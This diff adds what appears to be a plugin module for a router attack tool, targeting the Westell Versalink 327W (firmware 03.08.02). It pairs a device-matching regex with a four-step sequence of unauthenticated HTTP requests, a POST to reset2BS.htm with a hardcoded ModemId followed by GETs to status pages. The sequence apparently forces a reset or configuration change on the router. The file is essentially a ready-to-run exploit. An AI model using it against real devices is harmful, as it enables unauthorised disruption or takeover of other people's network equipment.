@@ -1,0 +1,21 @@
+"""
+versalink 327w 03.08.02
+"""
+
+vendor = 'westell'
+name = 'versalink 327w 03.08.02'
+regex = r'(?s).*(westell).*'
+
+# step #1
+data = 'reboot=0&ModemId=MDZCNDA0NTY5NDgxKkNCMTQ2'
+post('http://{routerip}/reset2BS.htm', data=data)
+
+# step #2
+get('http://{routerip}/reset2BS.htm?')
+
+# step #3
+get('http://{routerip}/indexBS.htm?')
+
+# step #4
+get('http://{routerip}/homeSumBS.htm?')
+
